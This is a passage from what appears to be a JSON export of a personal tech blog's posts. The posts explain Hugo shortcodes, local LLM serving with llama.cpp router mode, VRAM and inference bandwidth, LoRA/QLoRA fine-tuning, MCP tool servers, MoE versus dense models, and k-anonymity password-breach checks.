chatting!</li>\n</ol>","hugo-shortcodes":"<h2>What are Hugo Shortcodes?</h2>\n<p>Today I learned about Hugo shortcodes, which are simple snippets of code that can be inserted into markdown content files. They're a powerful way to add complex content or functionality without writing HTML directly in your markdown.</p>\n<h2>Basic Syntax</h2>\n<p>The basic syntax for a shortcode is:</p>\n<pre><code></code></pre>\n<p>For shortcodes that wrap content:</p>\n<pre><code>\n  Content to be processed\n\n</code></pre>\n<h2>Built-in Shortcodes</h2>\n<p>Hugo comes with several built-in shortcodes:</p>\n<h3>Figure</h3>\n<p>The <code>figure</code> shortcode is used to add images with captions:</p>\n<pre><code></code></pre>\n<h3>YouTube</h3>\n<p>Embedding YouTube videos is simple:</p>\n<pre><code></code></pre>\n<h3>Gist</h3>\n<p>You can embed GitHub gists:</p>\n<pre><code></code></pre>\n<h2>Creating Custom Shortcodes</h2>\n<p>I also learned how to create custom shortcodes. Here's the process:</p>\n<ol>\n<li>Create a file in the <code>layouts/shortcodes/</code> directory</li>\n<li>Write the template code for your shortcode</li>\n<li>Use it in your content</li>\n</ol>\n<p>For example, a simple alert shortcode might look like:</p>\n<pre><code class=\"language-html\">&#x3C;!-- layouts/shortcodes/alert.html -->\n&#x3C;div class=\"alert alert-{{ .Get 0 }}\">\n  {{ .Inner }}\n&#x3C;/div>\n</code></pre>\n<p>And you would use it like:</p>\n<pre><code>\nThis is a warning message!\n\n</code></pre>\n<h2>Why Shortcodes are Useful</h2>\n<p>Shortcodes help maintain:</p>\n<ul>\n<li><strong>Consistency</strong>: Ensure elements like callouts or notices look the same across your site</li>\n<li><strong>Simplicity</strong>: Complex HTML can be reduced to a simple shortcode</li>\n<li><strong>Maintainability</strong>: Change the appearance of elements site-wide by updating a single shortcode</li>\n</ul>\n<h2>Next Steps</h2>\n<p>I plan to create a set of custom shortcodes for:</p>\n<ul>\n<li>Code examples with syntax highlighting</li>\n<li>Callout boxes for tips, warnings, and notes</li>\n<li>Responsive image galleries</li>\n<li>Custom citation blocks</li>\n</ul>\n<p>This will make my content more engaging and easier to maintain in the long run.</p>","llama-swap-router":"<p>The problem: I have a 27B model (18GB VRAM) and a 9B model (7GB VRAM). Total: 25GB. Available VRAM: 23GB. Can't run both at once. But I want both available on demand — heavy model for complex reasoning, light model for quick tool outputs.</p>\n<p>Two approaches exist. One gave me 502 errors for days. The other worked.</p>\n<h2>llama-swap — the third-party solution</h2>\n<p>llama-swap is a lightweight Go binary that acts as a proxy in front of llama.cpp. The idea:</p>\n<ul>\n<li>You send a request with <code>\"model\": \"heavy\"</code></li>\n<li>llama-swap checks if the heavy model is loaded</li>\n<li>If not, it kills the current llama-server process, starts a new one with the heavy model config, waits for it to be ready</li>\n<li>Forwards your request</li>\n<li>You get a response 12 seconds later (model load time)</li>\n</ul>\n<p>It uses a YAML config that maps model names to llama-server commands:</p>\n<pre><code class=\"language-yaml\">models:\n  heavy:\n    cmd: llama-server --model heavy.gguf --port ${PORT} --n-gpu-layers 999\n    proxy: http://localhost:${PORT}\n  light:\n    cmd: llama-server --model light.gguf --port ${PORT} --n-gpu-layers 999\n    proxy: http://localhost:${PORT}\n</code></pre>\n<p>The <code>${PORT}</code> is filled in by llama-swap so you don't hardcode ports.</p>\n<p><strong>Why it didn't work for me:</strong> The YAML config used Go template macros (<code>{{.MODELS}}</code>) that didn't expand <code>~</code> in paths. The model subprocess would fail to start silently, llama-swap would report 502, and the logs just said \"non-200 response\" with no indication of why the subprocess died. Debugging this was infuriating because there was no way to see what command it was actually trying to run.</p>\n<p>The fix would have been using absolute paths everywhere. But by the time I figured that out, I'd found the better solution.</p>\n<h2>llama.cpp native router mode — the built-in solution</h2>\n<p>Shipped in December 2025. You start llama-server <em>without</em> a <code>-m</code> flag and point it at a directory of models:</p>\n<pre><code class=\"language-bash\">llama-server \\\n  --models-dir ~/.schizo/models \\\n  --models-preset ~/.schizo/models-preset.ini \\\n  --models-max 1 \\\n  --port 6969\n</code></pre>\n<p><code>--models-max 1</code> means only one model in VRAM at a time. LRU eviction: when a request comes in for model B while model A is loaded, model A gets unloaded, model B loads. You pay the swap time once, then subsequent requests to the same model are instant.</p>\n<p>Requests specify which model they want via the <code>model</code> field:</p>\n<pre><code class=\"language-bash\">curl http://localhost:6969/v1/chat/completions \\\n  -d '{\"model\": \"Qwen3.6-27B-Uncensored-HauhauCS-Aggressive-Q4_K_P\", ...}'\n</code></pre>\n<p>The model name matches the filename (without .gguf extension). llama-server finds it in the models directory, loads it with the preset settings, responds.</p>\n<p><strong>Per-model settings:</strong> The <code>--models-preset</code> INI file lets you specify different context sizes, GPU layers, cache types, and other settings per model:</p>\n<pre><code class=\"language-ini\">[Qwen3.5-9B-Uncensored-HauhauCS-Aggressive-Q6_K.gguf]\nctx-size     = 16384\nn-gpu-layers = 999\ncache-type-k = q4_0\nn-predict    = 4096\nflash-attn   = true\nthreads      = 8\n\n[Qwen3.6-27B-Uncensored-HauhauCS-Aggressive-Q4_K_P.gguf]\nctx-size     = 65536\nn-gpu-layers = 999\ncache-type-k = q4_0\nn-predict    = 4096\nflash-attn   = true\nthreads      = 16\nmmproj       = /home/appsec/.schizo/models/mmproj-...f16.gguf\npresence-penalty = 1.0\n</code></pre>\n<p>The gotcha I hit: wrote <code>max_tokens = 4096</code> in the INI file. That's an OpenAI API parameter, not a llama.cpp server flag. The correct one is <code>n-predict</code>. The router crashed on startup with <code>option 'max_tokens' not recognized</code> until I fixed it.</p>\n<p><strong>The built-in web UI:</strong> The router mode also serves a web interface at <code>http://localhost:6969</code>. There's a model dropdown, you can see which models are loaded (loaded/loading/unloaded status), manually trigger loads/unloads. It's basically Ollama's interface but in llama.cpp. Useful for quick testing.</p>\n<p><strong>Manual model control via API:</strong></p>\n<pre><code class=\"language-bash\"># List models and their status\ncurl http://localhost:6969/models\n\n# Pre-load the heavy model\ncurl -X POST http://localhost:6969/models/load \\\n  -d '{\"model\": \"Qwen3.6-27B-Uncensored-HauhauCS-Aggressive-Q4_K_P\"}'\n\n# Free VRAM\ncurl -X POST http://localhost:6969/models/unload \\\n  -d '{\"model\": \"Qwen3.6-27B-Uncensored-HauhauCS-Aggressive-Q4_K_P\"}'\n</code></pre>\n<h2>The smart router layer on top</h2>\n<p>The llama.cpp router picks models based on the <code>model</code> field in the request. By default, Goose sends whatever <code>GOOSE_MODEL</code> is set to. To get automatic switching between light and heavy based on prompt complexity, I added a thin Python FastAPI proxy on port 7000 that:</p>\n<ol>\n<li>Reads the incoming request</li>\n<li>Analyzes the prompt — length, keywords, complexity indicators</li>\n<li>Sets <code>body[\"model\"]</code> to either the light or heavy filename</li>\n<li>Forwards to port 6969</li>\n</ol>\n<p>So Goose → port 7000 (smart router) → port 6969 (llama.cpp router) → right model.</p>\n<p>Short prompt asking to parse nmap output → light model → 36 tok/s, responds in seconds.<br>\nLong prompt asking to analyze a complex auth flow for vulnerabilities → heavy model → 12-second swap + 15 tok/s, but the quality is worth it.</p>\n<h2>Actual swap times on L4</h2>\n<ul>\n<li>9B Q6_K (~7GB): ~4-5 seconds cold load</li>\n<li>27B Q4_K_P (~18GB): ~11-13 seconds cold load</li>\n<li>Subsequent requests to same model: instant (already loaded)</li>\n</ul>\n<p>The 12-second heavy model load is noticeable but not painful. You're usually reading the light model's output anyway while the heavy one spins up. And once it's loaded, it stays loaded until a light model request comes in.</p>\n<h2>tldr comparison</h2>\n<p>| | llama-swap | llama.cpp router mode |\n|</p>","llm-vram-inference":"<p>Okay so I kept hearing \"this model needs 24GB VRAM\" and I just accepted it as a fact of life without really understanding <em>why</em>. Like why can't it just use RAM? I have 64GB of RAM, that's way more than 24GB VRAM. Let me explain what I actually figured out.</p>\n<h2>What a model actually is</h2>\n<p>An LLM is basically a massive pile of numbers called <strong>parameters</strong> or <strong>weights</strong>. When you read \"Qwen3.6-27B\" the 27B is 27 billion of these numbers. Each number describes something about how language works — some capture grammar, some capture facts, some capture reasoning patterns. Nobody hand-coded them; they got learned by training on text.</p>\n<p>At inference time (when the model generates a response), every single one of those 27 billion numbers gets involved in calculating each token. The math is: input → multiply by weights → activate → multiply by more weights → repeat for every layer → output a probability distribution over the next token.</p>\n<p>That multiply-by-weights operation has to happen <strong>billions of times per token</strong>, and it has to happen fast enough that you don't wait 10 minutes for a response. GPUs are specifically built to do massive parallel matrix multiplications. CPUs can do it too, they're just 50-100x slower for this workload.</p>\n<h2>Why VRAM specifically</h2>\n<p>The GPU can only do fast math on data that's sitting in its own memory — VRAM. If the weights are in system RAM, the GPU has to fetch them over PCIe, which is a much slower bus. For a 27B model at 4-bit quantization, that's about 14-18GB of data that needs to move from wherever it's stored to wherever the GPU can multiply it.</p>\n<p>If it all fits in VRAM, every token is fast. If some of it is in RAM, every token requires PCIe transfers, and you're back to slow.</p>\n<p>The frustrating discovery I made: I had 14.5GB of VRAM sitting idle while my model ran at 3.4 tokens per second. Turned out my config was pushing all the computational work to CPU even though the GPU had room. The GPU was just computing attention layers while the CPU did all the heavy lifting. Felt like having a sports car and only using it to carry groceries.</p>\n<h2>What \"inference\" actually means</h2>\n<p>Inference = using a trained model to generate output. As opposed to training, which is teaching the model. When you run <code>llama-server</code> and hit it with a request, that's inference.</p>\n<p>During inference, the model generates one token at a time. It looks at everything that came before (the context), does the math across all its weights, and outputs probabilities for what token should come next. Then it picks one (or samples from the distribution based on temperature), appends it to context, and does it again.</p>\n<p>This is why <strong>context window</strong> matters for memory. The KV cache stores intermediate computation results for everything in the context. Longer context = bigger KV cache = more VRAM needed. For a typical transformer model at 32k context, the KV cache alone can be 4-8GB. The Qwen3.6-27B I ended up using has a trick here — it uses Gated DeltaNet layers (a kind of linear attention) for 75% of its layers, which store a fixed-size state instead of a growing cache. So 64k context only costs like 700MB. Huge win.</p>\n<h2>The bandwidth thing nobody explains</h2>\n<p>Here's what actually determines tokens-per-second: <strong>memory bandwidth</strong>, not compute.</p>\n<p>During inference, you're reading billions of weights from memory once per token. The speed limit is how fast you can read data, not how fast you can multiply it. An NVIDIA L4 has 300 GB/s bandwidth. An RTX 4090 has about 1000 GB/s. That's why the same model generates tokens 3x faster on a 4090 even though they have similar VRAM.</p>\n<p>Quick math: 27B model at 4-bit = ~14GB. At 300 GB/s bandwidth: 14GB / 300 GB/s ≈ 0.047 seconds per token = ~21 tokens/second theoretical max. In practice I got 15-18, which is reasonable. If I had a 4090, that same model would do 60+ tokens/second.</p>\n<h2>The takeaway</h2>\n<ul>\n<li>Model weights need to live in VRAM for fast inference</li>\n<li>The GPU bandwidth determines speed, not just size</li>\n<li>Context window adds KV cache on top of model weight memory</li>\n<li>System RAM is a fallback, not a solution — you pay a heavy PCIe penalty for every token</li>\n<li>For my L4 with 24GB VRAM, a 27B model at Q4 (~14-18GB) left just enough room for context and was the sweet spot</li>\n</ul>","lora-qlora-finetuning":"<p>Fine-tuning was always something I filed under \"requires A100s and a Google-sized budget.\" LoRA broke that assumption. Here's what it actually is.</p>\n<h2>The problem with full fine-tuning</h2>\n<p>A standard model fine-tune means: take the pretrained weights, run gradient descent on your dataset, update all the weights. For a 27B model, that's 27 billion numbers getting updated. To do that without memory issues, you need roughly 6-8× the model size in GPU memory during training (for optimizer states, gradients, activations). That's 150-200GB just to fine-tune Qwen3.6-27B. Multiple A100s territory.</p>\n<p>Even if you have the hardware, fine-tuning all parameters on a small dataset risks <strong>catastrophic forgetting</strong> — the model overwrites general knowledge to overfit on your data. You might teach it to write JSON output format and accidentally lobotomize its Python knowledge.</p>\n<h2>What LoRA is</h2>\n<p>LoRA (Low-Rank Adaptation) is a technique that sidesteps all of this. The key insight comes from a 2021 Microsoft Research paper: during fine-tuning, the <em>changes</em> to the weight matrices are actually low-rank. Meaning you don't need to represent the full update — you can approximate it with two much smaller matrices.</p>\n<p>Instead of updating a large weight matrix W directly, LoRA freezes W and adds trainable matrices A and B next to it:</p>\n<pre><code>output = W·x + (B·A)·x\n\nWhere:\n- W is frozen (27B params, not touched)\n- A is small: [rank × d_in]\n- B is small: [d_out × rank]\n- rank is typically 4, 8, 16, or 64\n- d_in, d_out are the original matrix dimensions\n</code></pre>\n<p>If your weight matrix is 4096×4096 (16M params) and you use rank 16:</p>\n<ul>\n<li>Full update: 16M parameters</li>\n<li>LoRA: A (4096×16) + B (16×4096) = 131K parameters</li>\n</ul>\n<p>You're training ~0.8% of the weight count of a full fine-tune, while covering the same model. At inference, you merge B·A back into W (or keep it separate as an adapter).</p>\n<p>This is why you see <code>.safetensors</code> adapter files that are 300-600MB for a 14GB model — the adapter contains only the LoRA matrices, not the full weights.</p>\n<h2>QLoRA — making it work on consumer hardware</h2>\n<p>QLoRA (Quantized LoRA) combines two ideas:</p>\n<ol>\n<li>Load the base model in 4-bit quantization (NF4 format) — reduces memory</li>\n<li>Train LoRA adapters on top of the frozen quantized model in 16-bit</li>\n</ol>\n<p>The trick is that even though the base weights are quantized, the LoRA matrices are trained in full precision. The quantized base provides context; the precise adapters learn the new behavior. Gradients flow through both.</p>\n<p>This let people fine-tune 7B models on a single RTX 3090 (24GB VRAM) and even 13B models with gradient checkpointing. Something that previously required a cluster of A100s became possible on hardware people actually own.</p>\n<h2>What you actually need for QLoRA fine-tuning</h2>\n<p><strong>Dataset:</strong> Your training data in a conversational format. For behavior changes, even 500-2000 examples can work. For knowledge injection, more is better. The format is usually instruction-response pairs:</p>\n<pre><code class=\"language-json\">{\"instruction\": \"Analyze this HTTP response for security issues\", \n \"input\": \"HTTP/1.1 200 OK\\nX-Powered-By: PHP/7.2.0\\n...\",\n \"output\": \"The X-Powered-By header reveals PHP 7.2.0, which is EOL...\"}\n</code></pre>\n<p><strong>Hardware:</strong> For a 7-9B model: 16-24GB VRAM works fine with QLoRA. For 13B: 24GB with gradient checkpointing. For 27B: you're looking at 40GB+ or need to use CPU offloading tricks (slow).</p>\n<p><strong>Software:</strong> Unsloth is the go-to in 2026. It's faster than HuggingFace PEFT, uses less memory, and has good documentation. Axolotl is the other popular one, more configurable, steeper learning curve.</p>\n<h2>A minimal Unsloth QLoRA training example</h2>\n<pre><code class=\"language-python\">from unsloth import FastLanguageModel\nfrom trl import SFTTrainer\nfrom transformers import TrainingArguments\nfrom datasets import load_dataset\n\n# Load model in 4-bit\nmodel, tokenizer = FastLanguageModel.from_pretrained(\n    model_name=\"unsloth/Qwen3-8B\",\n    max_seq_length=8192,\n    load_in_4bit=True,\n)\n\n# Add LoRA adapters\nmodel = FastLanguageModel.get_peft_model(\n    model,\n    r=16,                  # LoRA rank — higher = more capacity but more memory\n    target_modules=[\"q_proj\", \"k_proj\", \"v_proj\", \"o_proj\",\n                    \"gate_proj\", \"up_proj\", \"down_proj\"],\n    lora_alpha=16,         # scaling factor, usually same as r\n    lora_dropout=0,        # 0 is fine for most cases\n    bias=\"none\",\n    use_gradient_checkpointing=\"unsloth\",  # saves memory\n    random_state=42,\n)\n\n# Load your dataset\ndataset = load_dataset(\"json\", data_files=\"my_data.jsonl\")[\"train\"]\n\n# Train\ntrainer = SFTTrainer(\n    model=model,\n    tokenizer=tokenizer,\n    train_dataset=dataset,\n    dataset_text_field=\"text\",\n    max_seq_length=8192,\n    args=TrainingArguments(\n        per_device_train_batch_size=2,\n        gradient_accumulation_steps=4,\n        warmup_steps=10,\n        num_train_epochs=3,\n        learning_rate=2e-4,\n        fp16=True,\n        output_dir=\"./outputs\",\n        save_steps=100,\n    ),\n)\ntrainer.train()\n\n# Save just the adapter\nmodel.save_pretrained(\"./my-lora-adapter\")\n\n# Or merge and save full model\nmodel.save_pretrained_merged(\"./my-merged-model\", tokenizer)\n</code></pre>\n<h2>LoRA hyperparameters that actually matter</h2>\n<p><strong>Rank (r):</strong> How much capacity the adapter has. r=4 is minimal but fast. r=16 is the sweet spot for most tasks. r=64 for complex behavior changes. Higher rank = more trainable params = more VRAM = slower training.</p>\n<p><strong>Alpha:</strong> The scaling factor. Set it equal to rank and forget about it. Some people set it to 2× rank. The ratio alpha/rank is what matters, not the absolute values.</p>\n<p><strong>Target modules:</strong> Which weight matrices get adapters. Usually all the attention projections plus FFN. If you're short on memory, skip some FFN layers. The attention layers are usually more important.</p>\n<p><strong>Learning rate:</strong> 1e-4 to 3e-4 is the typical range for LoRA. Higher than full fine-tuning because only a small fraction of params are being trained. Too high and you'll overfit fast.</p>\n<h2>When to use LoRA vs when to just use RAG</h2>\n<p>| | LoRA Fine-tuning | RAG |\n|</p>","mcp-understood":"<p>MCP (Model Context Protocol) is the thing that turns an LLM from a text box into an agent that can actually <em>do stuff</em>. I kept seeing it mentioned everywhere without a clear explanation of what the client and server actually are and how the pipe works. Here's what I figured out.</p>\n<h2>The problem MCP solves</h2>\n<p>An LLM on its own can only produce text. It can describe how to run nmap, but it can't actually run it. It can write Python code, but it can't execute it. It lives in a prompt-response box.</p>\n<p>The way people tried to solve this before MCP was chaos — every agent framework (LangChain, AutoGPT, etc.) invented its own tool-calling format. If you built a Qdrant integration for LangChain, it didn't work in AutoGPT. If you built a shell execution tool for one agent, you had to rewrite it for every other agent. No standard.</p>\n<p>MCP is Anthropic's attempt at a standard protocol for connecting AI models to tools. The idea: write a tool once, use it anywhere that speaks MCP.</p>\n<h2>Client and server — what's actually what</h2>\n<p><strong>MCP Server:</strong> A process that exposes tools. That's it. It implements the MCP protocol and advertises \"I have these tools available, here's how to call them.\"</p>\n<p>My SearXNG MCP server is a Python script that:</p>\n<ol>\n<li>Reads JSON-RPC messages from stdin</li>\n<li>If the message is <code>tools/list</code>, responds with a list of available tools</li>\n<li>If the message is <code>tools/call</code>, runs a search against my local SearXNG instance and returns results</li>\n<li>Writes responses to stdout</li>\n</ol>\n<p>That's the whole server. It's a dumb process sitting there waiting for instructions over stdin/stdout.</p>\n<p><strong>MCP Client:</strong> The agent framework — in my case, Goose. The client is what orchestrates the LLM and talks to the servers. It:</p>\n<ol>\n<li>Starts the MCP server processes (via <code>cmd</code> and <code>args</code> in the config)</li>\n<li>Queries each server for available tools at startup</li>\n<li>Includes those tool descriptions in the LLM's context</li>\n<li>When the LLM decides to call a tool, the client serializes the call, sends it to the right server, gets the result, feeds it back to the LLM</li>\n</ol>\n<p>So the LLM never directly talks to the MCP server. The flow is:</p>\n<pre><code>LLM decides: \"I should search for CVE-2024-6387\"\n      ↓\nGoose (client) receives the tool call from LLM output\n      ↓\nGoose sends JSON-RPC to the searxng MCP server's stdin\n      ↓\nSearXNG server hits localhost:4000, gets results\n      ↓\nServer writes JSON response to stdout\n      ↓\nGoose reads it, formats it, injects into LLM context\n      ↓\nLLM continues with search results available\n</code></pre>\n<h2>The transport types</h2>\n<p><strong>stdio</strong> (most common): Server runs as a subprocess. Communication happens over stdin/stdout pipes. Dead simple, works on anything. My qdrant and searxng servers both use this.</p>\n<pre><code class=\"language-yaml\">searxng:\n  type: stdio\n  cmd: python3\n  args: [\"/opt/mcp-searxng/server.py\"]\n</code></pre>\n<p>Goose spawns <code>python3 /opt/mcp-searxng/server.py</code> and talks to it via pipes.</p>\n<p><strong>SSE / HTTP</strong>: Server runs as a network service. Used for remote servers or when you want multiple clients connecting to the same server. More complex, used for cloud integrations.</p>\n<h2>Why the <code>available_tools: []</code> in Goose config</h2>\n<p>When you add an extension in Goose's config.yaml, the <code>available_tools</code> field lists which specific tools from that server you want exposed to the LLM. Empty list means \"all of them.\" Specific entries let you restrict which tools the agent can call — useful if a server exposes 50 tools and you only want 3 of them visible.</p>\n<h2>The tool description is everything</h2>\n<p>When the client queries <code>tools/list</code>, each tool returns a name, description, and input schema. The description is what the LLM reads to understand when to call the tool. This is critical — a poorly written description means the LLM never calls the tool even when it should.</p>\n<p>My original searxng tool had description: \"search the web.\" The model called it rarely. After changing it to: \"Private web search via local SearXNG. Use for CVE lookups, PoC research, recent exploits, security advisories, and anything that might have changed after your training data cutoff\" — it started using it proactively.</p>\n<p>The LLM literally reads this description and decides whether to use the tool based on whether it seems relevant. Write it like you're writing a job posting for the tool.</p>\n<h2>The real win</h2>\n<p>Before MCP, each tool integration was a hardcoded connection between specific agent software and specific tools. With MCP:</p>\n<ul>\n<li>I write a searxng server once, it works in Goose, Claude Desktop, any MCP-compatible client</li>\n<li>Someone else writes a Burp Suite server, I just add it to my config, it works</li>\n<li>The LLM doesn't need to know implementation details — it just knows \"there's a tool called <code>searxng_search</code> that takes a query string\"</li>\n</ul>\n<p>It's basically USB for AI tools. Write the tool once, plug it into anything that has a USB port.</p>","moe-vs-dense-llms":"<p>I started this project wanting to run the biggest possible model because I figured bigger = smarter. Downloaded a 122B MoE model, got 3.4 tokens per second, spent a week debugging, and eventually switched to a 27B dense model that ran at 15-18 tok/s and performed better at my actual tasks. Here's what I learned.</p>\n<h2>What a dense model is</h2>\n<p>Every layer gets involved for every token. If you have 27B parameters arranged in 64 layers, all 64 layers process each input. All the parameters are \"always on.\" Simple, predictable, well-understood.</p>\n<p>Most of the older famous models are dense: GPT-2, LLaMA, Mistral-7B. The size you see is the size that runs. A 27B model uses 27B parameters worth of compute per token, no asterisks.</p>\n<h2>What a MoE (Mixture of Experts) model is</h2>\n<p>A MoE model has a different architecture. The FFN (feed-forward network) layers — which are the bulk of parameter count in transformers — are split into multiple \"experts.\" A smaller routing network decides which experts to activate for each token.</p>\n<p>So in Qwen3.5-122B-A10B:</p>\n<ul>\n<li>122B total parameters</li>\n<li>10B active parameters per token (the \"A10B\" part)</li>\n<li>The other 112B sit in memory, doing nothing for that token</li>\n<li>A router picks which 10B worth of experts are relevant</li>\n</ul>\n<p>In theory: you get the \"knowledge capacity\" of a 122B model (lots of experts covering different domains) with the compute cost of a 10B model. Smart!</p>\n<p>In practice: it depends heavily on your hardware.</p>\n<h2>Why MoE failed on my setup</h2>\n<p>The inactive parameters have to live <em>somewhere</em>. With 122B at Q4 = ~60GB and only 24GB VRAM, the inactive experts had to go into system RAM. Every token generation requires:</p>\n<ol>\n<li>Router decides which experts to use</li>\n<li>Those experts need to be in VRAM for fast computation</li>\n<li>The active experts might already be there or need to be loaded from RAM</li>\n<li>PCIe transfer from RAM to VRAM happens at ~16 GB/s</li>\n<li>That's the bottleneck</li>\n</ol>\n<p>In the ideal scenario, the same experts get activated repeatedly (high locality), and they stay cached in VRAM. In practice, with diverse prompts, you're constantly swapping experts in and out.</p>\n<p>My L4's PCIe bandwidth was the chokepoint. Even with the config fixed to use VRAM properly, a 60GB model on a 24GB GPU means constant RAM↔VRAM transfers.</p>\n<p>The dense 27B at Q4 is ~14-18GB. Fits entirely in 24GB VRAM. Zero PCIe transfers during inference. Every token: read weights from VRAM at 300 GB/s, done.</p>\n<h2>When MoE actually wins</h2>\n<p>MoE shines when you have enough VRAM for the entire model — or specifically enough VRAM for all the active parameters plus a fast NVMe/HBM2 to hold inactive ones.</p>\n<p>On a system with 80GB VRAM (like an A100 or H100), a 70B MoE model with 13B active params would:</p>\n<ul>\n<li>Keep the entire model in VRAM (80GB is enough)</li>\n<li>No RAM transfers ever</li>\n<li>Run at full memory bandwidth speed</li>\n<li>Have a 70B model's knowledge with 13B compute costs</li>\n</ul>\n<p>That's the sweet spot. Cloud inference providers with big multi-GPU machines love MoE because they can serve many concurrent requests with the compute efficiency of a smaller model while offering the quality of a larger one.</p>\n<p>For a single 24GB GPU at home, MoE is usually the wrong choice unless the entire model fits. If it doesn't fit, the PCIe bottleneck kills you.</p>\n<h2>The quality question</h2>\n<p>For coding and reasoning tasks specifically, Qwen3.6-27B consistently outperformed Qwen3.5-122B-A10B in benchmarks even before hardware is considered. The dense model has been fine-tuned more aggressively on specific tasks. The 122B MoE's breadth (lots of specialists) doesn't necessarily win on focused tasks.</p>\n<p>SWE-bench Verified (coding benchmark): Qwen3.6-27B scored 77.2%, while Qwen3.5-122B scored around 72%. The \"smaller\" model wins here.</p>\n<h2>The mental model</h2>\n<p>Think of MoE like a hospital with 50 specialist doctors vs. a dense model like one extremely good generalist surgeon. For any given problem, the specialist might be better — but if the hospital's logistics (PCIe, RAM bandwidth) are slow, getting the right specialist to the operating room takes too long, and the generalist who's already there wins on pure throughput.</p>\n<p><strong>Use a dense model when:</strong> You have limited VRAM and the model fits cleanly in it. Single GPU consumer hardware. Latency-sensitive applications.</p>\n<p><strong>Use a MoE model when:</strong> You have abundant VRAM, the full model fits, or you're serving in a high-throughput multi-GPU setup where the expert specialization actually pays off.</p>\n<h2>The practical test</h2>\n<p>When comparing models for a new setup, run this before committing:</p>\n<pre><code class=\"language-bash\"># Quick throughput test\nllama-bench -m model.gguf -ngl 999 -p 512 -n 128 -b 512\n\n# Watch VRAM during inference\nwatch -n0.5 nvidia-smi --query-gpu=memory.used --format=csv,noheader\n</code></pre>\n<p>If VRAM stays flat during inference and GPU utilization is high, the model is fully on GPU and you're in good shape. If VRAM is suspiciously low and the GPU is sitting at 9% utilization like mine was — something's wrong.</p>","ollama-llamacpp-vllm":"<p>When I started this project I kept seeing three names — Ollama, llama.cpp, vLLM — treated as roughly interchangeable. They're not. They solve the same problem (run LLMs locally) but make very different tradeoffs.</p>\n<h2>Ollama — the user-friendly one</h2>\n<p>Ollama wraps llama.cpp in a polished interface. You get:</p>\n<ul>\n<li><code>ollama run llama3</code> and it downloads, configures, and runs the model</li>\n<li>OpenAI-compatible API out of the box</li>\n<li>Auto-manages models (downloads, caches, serves)</li>\n<li>Works on Mac, Windows, Linux without configuration</li>\n</ul>\n<p>It's genuinely great for \"I want to run a model and talk to it.\" Zero config. The model library is curated, quantizations are chosen for you, everything just works.</p>\n<p>The tradeoff: it abstracts away almost everything. You can't easily swap quantization methods, tweak per-layer settings, or run custom router logic. The abstraction layer that makes it easy also makes it less flexible. For my use case — running community fine-tuned models in GGUF format with custom per-model presets and a router — Ollama would have needed a lot of workarounds.</p>\n<p>Also, Ollama uses its own modelfile format and model library. GGUF files from HuggingFace work, but the integration is less seamless than llama.cpp native.</p>\n<p><strong>Use Ollama when:</strong> You want to get a model running in 5 minutes and don't need to customize anything.</p>\n<h2>llama.cpp — the flexible one</h2>\n<p>This is the C++ inference engine that actually runs the model. Ollama uses it under the hood. Everything eventually runs on llama.cpp (or a fork of it).</p>\n<p>Running it directly gives you full control:</p>\n<ul>\n<li>Every startup flag, every quantization option, every thread count</li>\n<li>GGUF files from anywhere, no model library restrictions</li>\n<li>Multi-modal support (mmproj for vision models)</li>\n<li>The new router mode (run multiple models, switch on demand)</li>\n<li>Per-model preset files (INI format, control each model's settings separately)</li>\n<li>Flash attention, KV cache quantization, every optimization</li>\n</ul>\n<p>It's verbose. Starting the server means writing a command with 15 flags. Managing multiple models means writing INI configs. The router mode took me a while to find because it was added in December 2025 and wasn't widely documented yet.</p>\n<p>But for custom workflows — HauhauCS fine-tuned models with vision support, per-model context sizes, smart routing — nothing else gives this level of control.</p>\n<p><strong>Use llama.cpp when:</strong> You need fine-grained control, non-standard models, custom routing, or are building on top of the inference engine.</p>\n<h2>vLLM — the throughput one</h2>\n<p>vLLM is built for serving LLMs at scale. Its main innovation is <strong>PagedAttention</strong> — a memory management technique that handles KV cache like OS virtual memory, allowing much higher throughput when serving many concurrent requests.</p>\n<p>Where llama.cpp optimizes for single-user latency (fast time-to-first-token, fast streaming), vLLM optimizes for throughput (serve 100 requests efficiently by batching KV cache pages).</p>\n<p>It also has excellent FP8 support, which matters for data center GPUs like the L4. On an L4, FP8 roughly doubles throughput compared to FP16 because the L4's tensor cores are specifically good at INT8/FP8 operations.</p>\n<p>The gotchas:</p>\n<ul>\n<li>Doesn't natively handle GGUF files — needs HuggingFace safetensors format</li>\n<li>Vision model support (mmproj/vision encoder) OOMs on single GPU because the vision encoder stays resident in VRAM even when not needed</li>\n<li>More complex setup, more dependencies</li>\n<li>Designed for multi-GPU or cloud inference, overkill for single-GPU personal use</li>\n</ul>\n<p>I tried vLLM early on and hit the vision encoder OOM on my L4. For a model without vision support running many concurrent requests, vLLM would probably be faster. For my single-user agentic workload with a vision model, llama.cpp won.</p>\n<p><strong>Use vLLM when:</strong> You're serving multiple users concurrently, you have multi-GPU hardware, you want FP8 optimization on supported GPUs, or you're building production inference infrastructure.</p>\n<h2>The summary</h2>\n<p>| | Ollama | llama.cpp | vLLM |\n|</p>","password-found-in-breach":"<p>Your password manager tells you \"this password appeared in 2847 breaches\" — instantly. How? It doesn't have a breach database on your device. And it definitely shouldn't send your password to a server. So what's the trick?</p>\n<p><ideanode color=\"pink\"><strong>k-anonymity with hash prefixes.</strong> Send the first 5 characters of a SHA-1 hash. Get back all matching suffixes. Compare locally. Your actual password never touches the network.</ideanode></p>\n<h2>The 3-step flow</h2>\n<ol>\n<li><strong>Hash</strong> your password with SHA-1 → <code>6c7ca345f63f835cb353ff15bd6c5e052ec08e7a</code></li>\n<li><strong>Send only the first 5 chars:</strong> <code>6c7ca</code> to the API</li>\n<li><strong>Receive all suffixes</strong> that start with <code>6c7ca</code> — compare locally</li>\n</ol>\n<accordion title=\"Walked example: password &#x27;mypassword123&#x27;\" color=\"#ff2d95\">\n<pre><code>SHA-1(\"mypassword123\")\n→ 6c7ca345f63f835cb353ff15bd6c5e052ec08e7a\n\nSend to server: \"6c7ca\"\nServer returns: 500+ hash suffixes + breach counts\n  345F63F835CB353FF15BD6C5E052EC08E7A:2847  ← Match!\n  891A2F3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8E9F:156\n  ...\n\nCompare locally: suffix matches → password breached 2847 times\n</code></pre>\n</accordion>\n<h2>Why 5 characters?</h2>\n<ul>\n<li><strong>16^5 = ~1 million possible prefixes</strong> — each prefix covers hundreds of hashes, providing anonymity</li>\n<li><strong>O(1) lookup</strong> — the server indexes by prefix, no scanning needed</li>\n<li><strong>Network-friendly</strong> — returns ~500 results per query, sub-100ms response</li>\n</ul>\n<p>&#x3C;InteractiveCode defaultLanguage=\"python\" defaultValue={`import hashlib\nimport requests</p>\n<p>def 